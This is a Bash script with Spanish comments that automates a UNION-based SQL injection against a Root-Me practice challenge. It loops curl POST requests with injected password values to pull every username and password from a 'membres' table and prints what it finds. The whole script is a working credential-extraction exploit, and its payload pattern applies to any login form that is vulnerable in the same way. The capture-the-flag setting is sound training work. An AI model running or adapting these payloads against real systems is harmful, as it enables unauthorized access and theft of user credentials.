#!/bin/bash

# ================================================
# LISTAR TODOS LOS USUARIOS - CH30
# ================================================

URL="http://challenge01.root-me.org/web-serveur/ch30/"
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  LISTANDO USUARIOS - CH30${NC}"
echo -e "${BLUE}========================================${NC}"

echo -e "\n${YELLOW}[+] Extrayendo todos los usuarios...${NC}"

# Extraer todos los usuarios
for i in {1..10}; do
    username=$(curl -s -X POST "$URL" \
        -d "username=admin&password=' UNION SELECT 1,username,3,4 FROM membres LIMIT $((i-1)),1#" \
        | grep -E "[a-zA-Z0-9_]{1,5}" | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe" | grep -v "Membres" | grep -v "CREATE" | head -1)
    
    if [ -n "$username" ]; then
        echo -e "${GREEN}[✓] Usuario encontrado: $username${NC}"
    else
        echo -e "${YELLOW}[!] No hay más usuarios${NC}"
        break
    fi
done

echo -e "\n${YELLOW}[+] Extrayendo contraseñas de todos los usuarios...${NC}"

# Extraer contraseñas
for i in {1..10}; do
    password=$(curl -s -X POST "$URL" \
        -d "username=admin&password=' UNION SELECT 1,pass,3,4 FROM membres LIMIT $((i-1)),1#" \
        | grep -E "[a-zA-Z0-9_]{1,20}" | grep -v "login failed" | grep -v "Authentification" | grep -v "iframe" | grep -v "Membres" | grep -v "CREATE" | head -1)
    
    if [ -n "$password" ]; then
        echo -e "${GREEN}[✓] Contraseña encontrada: $password${NC}"
    else
        echo -e "${YELLOW}[!] No hay más contraseñas${NC}"
        break
    fi
done

echo -e "\n${BLUE}========================================${NC}"
echo -e "${BLUE}  FIN DE LISTADO${NC}"
echo -e "${BLUE}========================================${NC}"
